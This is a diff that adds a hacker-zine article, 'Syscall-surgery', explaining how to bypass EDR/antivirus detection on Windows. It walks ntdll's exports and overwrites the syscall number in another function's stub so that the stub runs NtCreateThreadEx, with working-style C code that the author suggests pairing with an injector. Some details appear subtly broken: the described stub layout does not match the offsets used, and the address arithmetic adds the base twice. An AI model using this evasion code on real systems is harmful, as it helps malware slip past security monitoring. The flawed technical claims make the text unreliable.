@@ -1,0 +1,198 @@
+
+    ===================================================
+    +                Syscall-surgery                  +
+    +                     Sleepy                      +
+    +                      2025                       +
+    ====================================================
+
+Today I am going to be introducing another technique for bypassing 
+modern EDR/AV solutions. One of the most useful techniques I have
+found is messing with how the system sees system calls and trying
+to completly break the foundation.
+
+Lets say Windows ntdll.dll is a office somwhere managing
+all these calls coming in from everywhere. Its job is to
+resolve these calls into stubs. This office must make sure
+that these stubs contain some important data, including the
+system call number in the 4th byte. Well theres a worker 
+(Sleepy) who keeps changing that 4th byte and throwing
+evrything off.
+
+In my mind, while I was working on my syscall-tracer tool,
+a thought popped in. What if I really were to change that
+4th byte and dynamically call a completly different function,
+using the original function stub. Well as I found out after
+throwing some C together that this is, as I expected, possible.
+
+Modern Windows sometimes changes syscall numbers in between
+versions. I will be walking through the process of dynamically 
+resolving syscall numbers and also how to patch that 4th byte.
+
+Before I begin, I really suggest you get familiar with the 
+structure of a syscall stub. Normally, a stub is 12 bytes
+in length. The breakdown goes as shown.
+
+================================================================
+mov eax, syscall_number   ; 2 bytes 
+mov edx, 0x7FFE0300      ; 6 bytes 
+syscall                  ; 2 bytes 
+ret                      ; 1–2 bytes 
+
+This is the 12 bytes structure
+================================================================
+
+What we are trying to accomplish is changing that first line inside
+of a differnt function stub. All while never calling the actual 
+API.
+
+This is my own take on abusing syscalls and how they function.
+
+
+[Getting to work]:
+
+To begin, to dynamically resolve the syscall number you must 
+first LoadLibrary() or manually map a dll into memory, but not 
+just any dll, ntdll. After Loading it into memory we will walk
+the PE structure. 
+
+================================================================
+
+HMODULE hMod = LoadLibraryEx("ntdll.dll", NULL, 0);
+if (!hMod) {
+    printf("error 1\n");
+    return 1;
+}
+
+//dos header
+PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)hMod;
+if (dh->e_magic != IMAGE_DOS_SIGNATURE) {
+    printf("error 3\n");
+    return 1;
+}
+
+//nt sections
+PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dh + dh->e_lfanew);
+if (nt->Signature != IMAGE_NT_SIGNATURE) {
+    printf("error 2\n");
+    return 1;
+}
+
+//option header
+PIMAGE_OPTIONAL_HEADER oh = &nt->OptionalHeader;
+
+=========================================================================
+
+As we work are way down into the system we will break off from our usual
+parsing and now target the export directory. Unlike my previous zine,
+Hookers.txt, which focused on imported functions.
+
+Now we must do some export work and set the export data directory to the
+address of the optional header data directory using the flag
+[IMAGE_DIRECTORY_ENTRY_EXPORT]. We will be also setting the RVAs, aka the 
+actual address relative to the base address of the PE file.
+
+
+=========================================================================
+
+PIMAGE_DATA_DIRECTORY exportDataDir = &oh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+
+PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)oh->ImageBase + exportDataDir->VirtualAddress);
+
+DWORD* functionRVAs = (DWORD*)((BYTE*)oh->ImageBase + exportDir->AddressOfFunctions);
+WORD* ordinals = (WORD*)((BYTE*)oh->ImageBase + exportDir->AddressOfNameOrdinals);
+int ordinalnum = -1;
+
+DWORD* nameRVAs = (DWORD*)((BYTE*)oh->ImageBase + exportDir->AddressOfNames);
+
+===========================================================================
+
+Now we get to the good stuff, we are going to create a loop that checks 
+ntdll.dll for a function name. In my case, I set the function name as 
+argv[1] for testing purposes, but I will using the syscall number 0xC9.
+0xC9 on my version of windows is NtCreateThreadEx so our goal here is 
+to use a random functions stub to create a thread. This is just one way
+of using this method, it can be used to resolve any function but creating
+a thread can be noisy, so lets fix that.
+
+My loop looks like this
+============================================================================
+
+char *retAddress;
+
+for (size_t i = 0; i < exportDir->NumberOfNames; i++) {
+
+    char* functionName = (char*)oh->ImageBase + nameRVAs[i];
+
+    //Starting the syscall work
+    if (strcmp(functionName, argv[1]) == 0) {
+
+    printf("Function: %s\n", (char*)oh->ImageBase + nameRVAs[i]);
+    printf("address: 0x%p\n", (char*)oh->ImageBase + nameRVAs[i]);
+    
+    ordinalnum = ordinals[i];
+
+    BYTE* func = (BYTE*)oh->ImageBase + functionRVAs[ordinalnum] + (BYTE)oh->ImageBase;
+
+    //reading that original byte
+    printf("syscall: \033[32m%02X\033[0m\n", func[4]);
+    
+    //Making sure the protections are good
+    DWORD oldProtect;
+    VirtualProtect(func, 12, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+    //patching 0xC9
+    *(BYTE*)(func + 4) = 0xC9;
+
+    HANDLE threadHandle = NULL;
+    HANDLE processHandle = GetCurrentProcess();
+
+    //My stub call 
+    //Create a function for exec() like a printf or a injector :)
+    NtCreateThreadEx_t stub = (NtCreateThreadEx_t)func;
+    NTSTATUS result = stub(&threadHandle, 0x1FFFFF, NULL, processHandle, exec, NULL, FALSE, 0, 0, 0, NULL);
+    if (result != 0) {
+        printf("Error %lu\n", GetLastError());
+    }
+
+    WaitForSingleObject(threadHandle, INFINITE);
+
+    retAddress = (char*)oh->ImageBase + nameRVAs[i];
+    }
+
+}
+
+============================================================================
+
+This above code loops through the ntdll functions until it finds argv[1], 
+then proceeds to get the original syscall number and patch it with the new
+one 0xC9. After patching the original stub we jump straight into calling 
+the new stub. 
+
+It is worth noting that in order to use a new function like NtCreateThreadEx
+you must manually define it in your code like this.
+
+============================================================================
+
+typedef NTSTATUS(NTAPI *NtCreateThreadEx_t)(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    PVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    PVOID lpStartAddress,
+    PVOID lpParameter,
+    ULONG Flags,
+    SIZE_T StackZeroBits,
+    SIZE_T SizeOfStackCommit,
+    SIZE_T SizeOfStackReserve,
+    PVOID lpBytesBuffer
+); //setting ntcreatethreadex struct
+
+============================================================================
+
+This concludes my zine syscall-surgery. Doing this kind of work really does
+start to feel like you are a surgeon operating on your computer, hence the 
+name. I hope this finds you well. See you again soon ;)
+
+Have fun, nerds
+
+[EOF]
